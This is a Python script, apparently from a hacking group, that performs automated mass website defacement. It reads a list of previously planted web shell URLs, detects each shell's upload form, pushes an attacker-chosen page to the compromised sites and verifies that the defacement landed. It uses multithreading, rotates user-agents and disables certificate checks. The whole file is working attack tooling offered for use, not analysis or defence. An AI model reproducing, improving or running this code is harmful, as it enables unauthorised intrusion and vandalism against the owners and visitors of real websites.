# Decode By Error x Ethan| Fixed By Error x Ethan 
# Updated: Removed Approval System & Updated User-Agents

import os, sys, time, random, hashlib
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

GREEN   = '\033[92m'
RED     = '\033[91m'
YELLOW  = '\033[93m'
BLUE    = '\033[94m'
CYAN    = '\033[96m'
MAGENTA = '\033[95m'
RESET   = '\033[0m'
BOLD    = '\033[1m'

# Latest 2024-2025 High-Quality User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Edge/120.0.0.0'
]
PROXIES = {}

def banner():
    # Clear screen (cross-platform)
    os.system('cls' if os.name == 'nt' else 'clear')

    banner_text = f"""{BOLD}{CYAN}
           🌎 WELCOME TO DARK TOOLS 💀

{RED}
      ██████╗ ░░█████╗░██████╗░██╗░░██╗
      ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
      ██║░░██║███████║██████╔╝█████═╝░
      ██║░░██║██╔══██║██╔══██╗██╔═██╗░
      ██████╔╝██║░░██║██║░░██║██║░╚██╗
      ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝  

{RED}║{YELLOW}      TOOLS CREATED BY DARK CLOUD LOGS {RED}       ║
{RED}╚══════════════════════════════════════════════╝
{MAGENTA}          DARK AUTO DEFACE UP TOOLS
{CYAN}            OWNER  : DARK_CLOUD_LOGS_BOT

{GREEN}═══════════════════════════════════════════════
{RESET}"""
    print(banner_text)

def get_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS), 
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
        'Accept-Language': 'en-US,en;q=0.5', 
        'Connection': 'keep-alive', 
        'Upgrade-Insecure-Requests': '1'
    }

def detect_file_input_name(url):
    """Detect file input field name in forms"""
    try:
        headers = get_headers()
        response = requests.get(url, headers=headers, proxies=PROXIES, timeout=20, verify=False)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        for form in soup.find_all("form"):
            if form.get("enctype") == "multipart/form-data" or "upload" in str(form).lower():
                file_input = form.find("input", {"type": "file"})
                if file_input and file_input.get("name"):
                    return file_input.get("name")
            file_input = form.find("input", {"type": "file"})
            if file_input and file_input.get("name"):
                return file_input.get("name")
        file_input = soup.find("input", {"type": "file"})
        if file_input and file_input.get("name"):
            return file_input.get("name")
        return None
    except: return None

def upload_file(shell_url, file_path, input_name, file_name_only):
    """Upload file to the target shell"""
    try:
        headers = get_headers()
        with open(file_path, 'rb') as f:
            files = {input_name: (file_name_only, f, 'application/octet-stream')}
            data = {}
            response = requests.get(shell_url, headers=headers, proxies=PROXIES, timeout=20, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            form = soup.find('form')
            if form:
                for inp in form.find_all('input'):
                    if inp.get('type') in ['hidden', 'text'] and inp.get('name'):
                        data[inp['name']] = inp.get('value', '')
            post_response = requests.post(shell_url, headers=headers, files=files, data=data, proxies=PROXIES, timeout=20, verify=False)
            return post_response.status_code in (200, 201, 202)
    except: return False

def check_uploaded_file_direct(shell_url, file_name):
    """Check uploaded file by trying possible URLs"""
    try:
        parsed = urlparse(shell_url)
        shell_dir = os.path.dirname(parsed.path) or '/'
        possible_urls = [
            f'{parsed.scheme}://{parsed.netloc}{shell_dir}/{file_name}',
            f'{parsed.scheme}://{parsed.netloc}/{file_name}',
            f'{parsed.scheme}://{parsed.netloc}{shell_dir}/uploads/{file_name}'
        ]
        possible_urls = list(set(possible_urls))
        headers = get_headers()
        for url in possible_urls:
            try:
                resp = requests.get(url, headers=headers, proxies=PROXIES, timeout=20, verify=False)
                if resp.status_code == 200 and 'DARK CLOUD LOGS' in resp.text.upper():
                    return url
            except: continue
        return None
    except: return None

def save_successful_url(url):
    """Save a successful URL to file"""
    try:
        with open('successful.txt', 'a', encoding='utf-8') as sf:
            sf.write(url + '\n')
        return True
    except: return False

def process_shell(shell):
    """Process a single shell URL"""
    try:
        if not shell.startswith(('http://', 'https://')):
            shell = 'http://' + shell
        input_name = detect_file_input_name(shell)
        if not input_name: return (False, None)
        upload_success = upload_file(shell, upload_file_path, input_name, file_name_only)
        if not upload_success: return (False, None)
        uploaded_url = check_uploaded_file_direct(shell, file_name_only)
        if not uploaded_url: return (False, None)
        headers = get_headers()
        response = requests.get(uploaded_url, headers=headers, proxies=PROXIES, timeout=20, verify=False)
        if response.status_code == 200 and 'DARK CLOUD LOGS' in response.text.upper():
            save_successful_url(uploaded_url)
            return (True, uploaded_url)
        return (False, None)
    except: return (False, None)

def main():
    global file_name_only
    global upload_file_path

    banner() # Direct start, no key needed

    shell_file = input(f'{BLUE}[?] Shell list file (e.g., shells.txt): {RESET}').strip()
    upload_file_path = input(f'{YELLOW}[?] Enter file to upload (e.g., index.html): {RESET}').strip()

    try:
        max_workers = int(input(f'{YELLOW}[?] Max workers (default 20): {RESET}').strip() or '20')
    except:
        max_workers = 20

    if not os.path.exists(shell_file) or not os.path.exists(upload_file_path):
        print(f'{RED}[✗] Required files not found! Check paths.{RESET}')
        return

    file_name_only = os.path.basename(upload_file_path)
    
    with open(shell_file, 'r', encoding='utf-8') as f:
        shells = [line.strip() for line in f if line.strip()]

    if not shells:
        print(f'{RED}[✗] No URLs found in file.{RESET}')
        return

    open('successful.txt', 'w').close()
    print(f'{BLUE}[i] Targets: {len(shells)} | Workers: {max_workers}{RESET}')
    print(f'{YELLOW}[*] Processing...{RESET}\n')

    success_count = 0
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_shell = {executor.submit(process_shell, shell): shell for shell in shells}
        for future in tqdm(as_completed(future_to_shell), total=len(shells), desc='Uploading'):
            try:
                success, url = future.result()
                if success:
                    success_count += 1
                    print(f'{GREEN}[✓] SUCCESS: {url}{RESET}')
            except: pass

    print(f'\n{GREEN}[✓] COMPLETED! Successful uploads: {success_count}{RESET}')
    if success_count > 0:
        print(f'{GREEN}[i] Saved to: successful.txt{RESET}')

if __name__ == '__main__':
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        main()
    except KeyboardInterrupt:
        print(f'\n{RED}[!] Interrupted.{RESET}')
